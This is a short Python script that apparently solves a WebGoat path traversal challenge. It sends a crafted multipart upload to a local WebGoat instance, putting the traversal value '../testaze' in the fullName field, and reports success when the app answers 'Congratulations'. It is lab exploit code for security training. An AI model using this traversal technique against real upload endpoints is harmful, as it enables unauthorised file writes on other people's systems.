import requests
import json
import logging

def run_script(url, cookie, proxy='127.0.0.1:8081'):
    logging.basicConfig(format='%(message)s',level=logging.INFO)
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------147242742018205087623998617952", "Origin": "http://127.0.0.1:8080", "Connection": "close", "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "X-PwnFox-Color": "red"}
    data = "-----------------------------147242742018205087623998617952\r\nContent-Disposition: form-data; name=\"uploadedFile\"; filename=\"user-profile-icon.png\"\r\nContent-Type: image/png\r\n\r\nRIFF\xc3\x88\x1a\x00\x00WEBPVP8L\xc2\xbc\x1a\x00\x00/\xc3\xbf\xc3\x81\x10\xc3\x8f\x11\x11\x0c\xc3\x9b\xc2\xb6\r\x1b+\x16\xc3\x8a\xc2\x8b\xc3\xa7\x1ck\x1b$\x17\x15\xc2\xa9\xc3\x95:\xc3\x81\xc2\x94\xc3\xbb\xc2\xb88\n\r\n-----------------------------147242742018205087623998617952\r\nContent-Disposition: form-data; name=\"fullName\"\r\n\r\n../testaze\r\n-----------------------------147242742018205087623998617952\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\ntest@test.com\r\n-----------------------------147242742018205087623998617952\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\ntest\r\n-----------------------------147242742018205087623998617952--\r\n"
    response=requests.post(url, headers=headers, data=data, proxies=proxies)
    response_json = json.loads(response.text)
    if 'Congratulations' in response_json["feedback"]:
        logging.info('[*] Challenge path_traversal validé\n')